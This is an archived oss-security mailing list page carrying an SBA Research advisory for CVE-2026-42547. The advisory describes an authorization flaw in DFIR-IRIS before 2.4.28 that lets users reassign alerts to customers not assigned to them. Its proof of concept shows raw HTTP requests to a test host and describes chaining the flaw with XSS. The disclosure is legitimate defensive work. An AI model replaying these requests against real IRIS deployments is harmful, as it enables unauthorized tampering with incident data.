@@ -1,0 +1,360 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<title>oss-security - [SBA-ADV-20260128-05] CVE-2026-42547: DFIR-IRIS before 2.4.28 Alerts
+ Can be Falsely Attributed to Customers</title>
+
+<link href="/style.css" type="text/css" rel="stylesheet">
+<style type="text/css">
+.calendar { text-align: center; }
+.ccell { background: #ccc; width: 5ex; padding: 2px; }
+
+.cal_brief { text-align: center; }
+.cal_brief td:first-child { background: inherit; }
+.cal_brief td { background: #ccc; width: 5ex; padding: 2px; }
+.cal_big { text-align: center; padding: 0; margin: 0; }
+.cal_big td { padding: 0 2px; }
+.cal_mon { text-align: center; }
+.cal_mon th { font-size: small; padding: 0; margin: 0; }
+.cal_mon td { background: #ccc; width: 5ex; height: 1.5em;
+	padding: 2px; text-align: right; }
+.cal_mon td[colspan] { background: inherit; }
+.cal_mon sup { color: #F0F0F0; text-align: left; float: left;
+	margin-top: -2pt; font-weight: bold; }
+.cal_mon a { text-align: right; margin-left: -4em; float: right; }
+</style>
+</head>
+
+<BODY bgcolor="#E0E0E0" text="black" link="blue" alink="red" vlink="navy">
+
+
+<table bgcolor="#ffffff" width="100%" border="0" cellspacing="0" cellpadding="0">
+<tr>
+
+<td>
+<a href="/"><img class="logo" src="/logo.png" border="0" width="182" height="80" alt="Openwall"></a>
+<td width="100%">
+<div class="nav">
+<ul>
+<li><a href="/">Products</a>
+<ul>
+<li><a href="/Owl/">Openwall GNU/*/Linux &nbsp; <i>server OS</i></a>
+<li><a href="/lkrg/">Linux Kernel Runtime Guard</a>
+<li><a href="/john/">John the Ripper &nbsp; <i>password cracker</i></a>
+<ul>
+<li><a href="/john/">Free &amp; Open Source for any platform</a>
+<li><a href="/john/cloud/">in the cloud</a>
+<li><a href="/john/pro/linux/">Pro for Linux</a>
+<li><a href="/john/pro/macosx/">Pro for macOS</a>
+</ul>
+<li><a href="/wordlists/">Wordlists &nbsp; <i>for password cracking</i></a>
+<li><a href="/passwdqc/">passwdqc &nbsp; <i>policy enforcement</i></a>
+<ul>
+<li><a href="/passwdqc/">Free &amp; Open Source for Unix</a>
+<li><a href="/passwdqc/windows/">Pro for Windows (Active Directory)</a>
+</ul>
+<li><a href="/yescrypt/">yescrypt &nbsp; <i>KDF &amp; password hashing</i></a>
+<li><a href="/yespower/">yespower &nbsp; <i>Proof-of-Work (PoW)</i></a>
+<li><a href="/crypt/">crypt_blowfish &nbsp; <i>password hashing</i></a>
+<li><a href="/phpass/">phpass &nbsp; <i>ditto in PHP</i></a>
+<li><a href="/tcb/">tcb &nbsp; <i>better password shadowing</i></a>
+<li><a href="/pam/">Pluggable Authentication Modules</a>
+<li><a href="/scanlogd/">scanlogd &nbsp; <i>port scan detector</i></a>
+<li><a href="/popa3d/">popa3d &nbsp; <i>tiny POP3 daemon</i></a>
+<li><a href="/blists/">blists &nbsp; <i>web interface to mailing lists</i></a>
+<li><a href="/msulogin/">msulogin &nbsp; <i>single user mode login</i></a>
+<li><a href="/php_mt_seed/">php_mt_seed &nbsp; <i>mt_rand() cracker</i></a>
+</ul>
+<li><a href="/services/">Services</a>
+<li id="narrow-li-1"><a>Publications</a>
+<ul>
+<li><a href="/articles/">Articles</a>
+<li><a href="/presentations/">Presentations</a>
+</ul>
+<li><a>Resources</a>
+<ul>
+<li><a href="/lists/">Mailing lists</a>
+<li><a href="https://openwall.info/wiki/">Community wiki</a>
+<li><a href="https://github.com/openwall">Source code repositories (GitHub)</a>
+<li><a href="/mirrors/">File archive &amp; mirrors</a>
+<li><a href="/signatures/">How to verify digital signatures</a>
+<li><a href="/ove/">OVE IDs</a>
+</ul>
+<li id="last-li"><a href="/news">What's new</a>
+</ul>
+</div>
+
+
+</table>
+
+
+<TABLE bgcolor="#B4D0DC" width="100%" border="0" cellspacing="0" cellpadding="1">
+<TR><TD>
+<TABLE width="100%" border="0" cellspacing="0" cellpadding="2">
+<TR><TD bgcolor="#ECF8FF">
+<a href="https://twitter.com/openwall">
+Follow @Openwall on Twitter for new release announcements and other news</a>
+
+</TABLE>
+</TABLE>
+
+<a href="11">[&lt;prev]</a> <a href="13">[next&gt;]</a> <a href=".">[day]</a> <a href="..">[month]</a> <a href="../..">[year]</a> <a href="../../..">[list]</a>
+<pre style="white-space: pre-wrap">
+Message-ID: &lt;953cdd7855684a9cbf81c888e28d938a&#64;sba-research.org&gt;
+Date: Tue, 19 May 2026 14:16:01 +0000
+From: SBA Research Security Advisory &lt;advisory&#64;...-research.org&gt;
+To: "oss-security&#64;...ts.openwall.com" &lt;oss-security&#64;...ts.openwall.com&gt;
+Subject: [SBA-ADV-20260128-05] CVE-2026-42547: DFIR-IRIS before 2.4.28 Alerts
+ Can be Falsely Attributed to Customers
+
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA256
+
+# DFIR-IRIS Alerts Can be Falsely Attributed to Customers #
+
+Link: <a href="https://github.com/sbaresearch/advisories/tree/public/2026/SBA-ADV-20260128-05_DFIR-IRIS_Incorrect_Alert_Authorization" rel="nofollow">https://github.com/sbaresearch/advisories/tree/public/2026/SBA-ADV-20260128-05_DFIR-IRIS_Incorrect_Alert_Authorization</a>
+
+## Vulnerability Overview ##
+
+Users can create alerts for customers that are not assigned to them.
+This can be abused to falsely attribute fake alerts to customers.
+In combination with Cross-Site Scripting, this can also be used to exfiltrate
+alerts from other customers.
+
+* **Identifier**            : SBA-ADV-20260128-05
+* **Type of Vulnerability** : Alerts Can be Falsely Attributed to Customers
+* **Software/Product Name** : [IRIS](<a href="https://www.dfir-iris.org/" rel="nofollow">https://www.dfir-iris.org/</a>)
+* **Vendor**                : [DFIR-IRIS](<a href="https://github.com/dfir-iris" rel="nofollow">https://github.com/dfir-iris</a>)
+* **Affected Versions**     : &lt;= 2.4.27
+* **Fixed in Version**      : v2.4.28
+* **CVE ID**                : CVE-2026-42547
+* **CVSS Vector**           : CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N
+* **CVSS Base Score**       : 5.4 (Medium)
+
+## Vendor Description ##
+
+&gt; IRIS is a collaborative digital platform designed for incident response
+&gt; analysts to share complex investigations at a technical level. It can be
+&gt; installed on a dedicated server or as a portable application for roaming
+&gt; investigations where internet access might not be available.
+
+Source: &lt;<a href="https://docs.dfir-iris.org/2.4.24/" rel="nofollow">https://docs.dfir-iris.org/2.4.24/</a>&gt;
+
+## Impact ##
+
+Attackers can falsely attribute fake alerts to customers that are not
+assigned to them. In combination with Cross-Site Scripting, this can also be
+used to exfiltrate alerts from customers that are not assigned to the
+attackers.
+
+## Vulnerability Description ##
+
+Users have two requirements to successfully create new alerts: They must be
+in a group with `alerts_write` privileges, and they need to have a particular
+customer assigned. New alerts can then be created for assigned customers. The
+same requirements hold for updating an alert, but the new properties are not
+validated against security rules.
+
+## Proof of Concept ##
+
+In this example, the user is creating a new alert for a customer named “Test
+Customer 1” with the customer ID 3, who is assigned to the user:
+
+```http
+POST /alerts/add HTTP/1.1
+Host: myiris.local
+Authorization: Bearer Ia4wMgyfDHlX3Tk1NJpBRkHU5sRUFMgmDFskX143vfZh1aRKJ7uuwijEcYsVuDAzZhxYB67Hjo0R2uK9gK-pbA
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/json;charset=UTF-8
+Referer: <a href="https://myiris.local/alerts?cid=2&amp;page=1&amp;per_page=10&amp;sort=desc" rel="nofollow">https://myiris.local/alerts?cid=2&amp;page=1&amp;per_page=10&amp;sort=desc</a>
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+X-Pwnfox-Color: pink
+Priority: u=0, i
+Te: trailers
+Connection: keep-alive
+Content-Length: 4286
+
+{
+  "alert_title": "This alert was submitted for Test Customer 1",
+  "alert_description": "This is a test alert, courtesy of MS",
+  "alert_source": "Source 1",
+  "alert_source_ref": "Test-12345",
+  […]
+  "alert_customer_id": 3,
+  "alert_classification_id": 1
+}
+
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 27 Jan 2026 09:33:42 GMT
+Content-Type: application/json
+Content-Length: 11226
+Connection: keep-alive
+Vary: Cookie
+Set-Cookie: session=eyJwZXJtaXNzaW9ucyI6MzMzfQ.aXNAdg.rxVBEtIpn7JBpr_E-4ln78AyIL8; Secure; HttpOnly; Path=/; SameSite=Lax
+Content-Security-Policy: default-src 'self' <a href="https://analytics.dfir-iris.org" rel="nofollow">https://analytics.dfir-iris.org</a>; script-src 'self' 'unsafe-inline' <a href="https://analytics.dfir-iris.org" rel="nofollow">https://analytics.dfir-iris.org</a>; style-src 'self' 'unsafe-inline'; img-src 'self' data:;
+X-XSS-Protection: 1; mode=block
+X-Frame-Options: DENY
+X-Content-Type-Options: nosniff
+Strict-Transport-Security: max-age=31536000: includeSubDomains
+Front-End-Https: on
+
+{"status": "success",
+[…]
+}
+```
+
+This is also properly reflected in the alerts overview of the user:
+
+![Alert overview of the user](images/Authz_user_alert_overview_with_alert.png)
+
+Existing alerts can be modified. This still requires the `alerts_write`
+permission and the customer assignment. There is, however, no check for the
+updated properties. As long as database constraints are upheld, e.g., not
+re-using primary keys, any update is accepted.
+
+In our scenario, the user, having only customer 3 assigned, updates the
+previously created alert and sets the `alert_customer_id` to 4.
+
+```http
+POST /alerts/update/9 HTTP/1.1
+Host: myiris.local
+Authorization: Bearer Ia4wMgyfDHlX3Tk1NJpBRkHU5sRUFMgmDFskX143vfZh1aRKJ7uuwijEcYsVuDAzZhxYB67Hjo0R2uK9gK-pbA
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/json;charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 23
+Origin: <a href="https://myiris.local" rel="nofollow">https://myiris.local</a>
+Referer: <a href="https://myiris.local/alerts?cid=2&amp;page=1&amp;per_page=10&amp;sort=desc" rel="nofollow">https://myiris.local/alerts?cid=2&amp;page=1&amp;per_page=10&amp;sort=desc</a>
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+X-Pwnfox-Color: pink
+Priority: u=0
+Te: trailers
+Connection: keep-alive
+
+{"alert_customer_id":4}
+
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 27 Jan 2026 09:46:18 GMT
+Content-Type: application/json
+Content-Length: 11664
+Connection: keep-alive
+Vary: Cookie
+Set-Cookie: session=eyJwZXJtaXNzaW9ucyI6MzMzfQ.aXNDag.Wp7bYXWmy-MfWMraEtaLQUDmjoE; Secure; HttpOnly; Path=/; SameSite=Lax
+Content-Security-Policy: default-src 'self' <a href="https://analytics.dfir-iris.org" rel="nofollow">https://analytics.dfir-iris.org</a>; script-src 'self' 'unsafe-inline' <a href="https://analytics.dfir-iris.org" rel="nofollow">https://analytics.dfir-iris.org</a>; style-src 'self' 'unsafe-inline'; img-src 'self' data:;
+X-XSS-Protection: 1; mode=block
+X-Frame-Options: DENY
+X-Content-Type-Options: nosniff
+Strict-Transport-Security: max-age=31536000: includeSubDomains
+Front-End-Https: on
+
+{"status": "success",
+[…]
+}
+```
+
+After the change, the alert is no longer available to the user:
+
+![Alert overview without the previously created alert](images/Authz_user_alert_overview_without_alert.png)
+
+The alert can also no longer be modified by this particular user as they
+don’t have the new customer assigned. We can see the newly assigned alert in
+the alerts overview of the admin user:
+
+![Alert overview of the admin, with the newly assigned alert](images/Authz_admin_alert_overview_with_alert.png)
+
+This can also work the other way round. By utilizing Cross-Site Scripting
+attacks, an attacker could manipulate other users with `alerts_write`
+privileges to re-assign alerts to customers the attacker has control over.
+
+## Recommended Countermeasures ##
+
+We recommend updating to IRIS version 2.4.28 or later.
+
+We suggest two mitigations: First, the alert update API should only accept
+properties that can also be changed in the web interface. The web UI offers
+only changes to a limited set of properties, and notably does not include the
+option to re-assign the customer.
+
+Second, security-relevant properties need to be checked during the update. If
+the change breaks rules, e.g., no access to the alert after changing the
+customer ID, the update should fail.
+
+## Timeline ##
+
+* `2026-01-28` Identified the vulnerability in version 2.4.26
+* `2026-01-30` Initial vendor contact via e-mail
+* `2026-02-27` Second vendor contact via e-mail
+* `2026-03-30` Report on GitHub due to a missing response from the vendor
+* `2026-04-27` Version containing fix (v2.4.28) tagged by vendor
+* `2026-04-28` GitHub assigned CVE-2026-42547
+* `2026-05-04` Confirm fix for v2.4.28
+* `2026-05-19` Public disclosure
+
+## References ##
+
+* OWASP Cheat Sheet Series. Authorization Cheat Sheet:
+  &lt;<a href="https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html" rel="nofollow">https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html</a>&gt;
+* OWASP Application Security Verification Standard (ASVS) v5.0.0. Section V8
+  Authorization:
+  &lt;<a href="https://raw.githubusercontent.com/OWASP/ASVS/v5.0.0/5.0/OWASP_Application_Security_Verification_Standard_5.0.0_en.pdf" rel="nofollow">https://raw.githubusercontent.com/OWASP/ASVS/v5.0.0/5.0/OWASP_Application_Security_Verification_Standard_5.0.0_en.pdf</a>&gt;
+* Common Weakness Enumeration. CWE-863 Incorrect Authorization:
+  &lt;<a href="https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html" rel="nofollow">https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html</a>&gt;
+
+## Credits ##
+
+* Michael Koppmann ([SBA Research](<a href="https://www.sba-research.org/" rel="nofollow">https://www.sba-research.org/</a>))
+* Mathias Tausig ([SBA Research](<a href="https://www.sba-research.org/" rel="nofollow">https://www.sba-research.org/</a>))
+
+The discovery of this vulnerability was made possible through support from
+[CYSSDE](<a href="https://cyssde.eu/" rel="nofollow">https://cyssde.eu/</a>) and the European Union.
+
+![CYSSDE](images/cyssde.png)
+-----BEGIN PGP SIGNATURE-----
+
+iQJPBAEBCAA5FiEEL9Wp/yZWFD9OpIt6+7iGL1j3dbIFAmoMcJ4bFIAAAAAABAAO
+bWFudTIsMi41KzEuMTIsMiwxAAoJEPu4hi9Y93WyJTEQALy4ZTnDiiT3eY7G1d40
+1efWgifMOEOO0dZJwLpwlQ/+o0TfpIwTOHxdkl1ODg/QQhyFyZ2ujzQntgQ0fIdq
+Shgpn7MfbrkyGlbbG38BTO5RLDD5C/MAT2riwj/ksH0Wmx27KyY6ckI3MxY9JS84
+7qwoI2PjLImTM0bHEx5mxt+lxG0lmEvrZrmI5MGt+A0b8V3kvPToeF+Om2IZO+bD
+hGNWXGhPKt2Z48PAcBV7ahcKXrY5F/sBv59c5UtsE7cR23Lzdm2UofNPrZ7mXQkG
+LSYlf+jfgA6nCbEX2wBYgIs+oKV8o14GuM6wE+4gcuVs5f55WlFvbW4Ns6S1uoGG
+yjR9WdjuepeZhyhxOBPfv7z768zBgjiRmuDalTUU2pVkYdn3Bu1qPSTFcD7bVYni
+7QA4Y4HP4//zX4ycx0OpW6N+abKWQacN7vBSlBvRt/cJEShq9B/+Voj6OlGELeHo
+sOKpUQY8Y9osK0sMifFiVJ6xOcQtWrJLOFqBDJDDp4BwI9VS7jVtBIEAYxbu+vPx
+rKSn3ftEPiEqo9yCQo7lDYPU6XKjEWa+6oXs3gZky0XX/zV9fx2niK+BCLpUcd/z
++ppQHtjrZz0VmxHYrAaiGiGqROmcP4kX7tmMR6frQ2764t4yBPgi2kmjxP2Q0FNG
+copHodmQaTw6pWnj9707Xyk6
+=9aP+
+-----END PGP SIGNATURE-----
+</pre>
+<p><a href="https://www.openwall.com/blists/">Powered by blists</a> - <a href="https://lists.openwall.net">more mailing lists</a>
+
+
+<p>
+Please check out the
+<a href="https://oss-security.openwall.org/wiki/">
+Open Source Software Security Wiki</a>, which is counterpart to this
+<a href="https://oss-security.openwall.org/wiki/mailing-lists/oss-security">mailing list</a>.
+<p>
+Confused about <a href="/lists/">mailing lists</a> and their use?
+<a href="https://en.wikipedia.org/wiki/Electronic_mailing_list">Read about mailing lists on Wikipedia</a>
+and check out these
+<a href="https://www.complang.tuwien.ac.at/anton/mail-news-errors.html">guidelines on proper formatting of your messages</a>.
+<p>
+
+</body>
+</html>
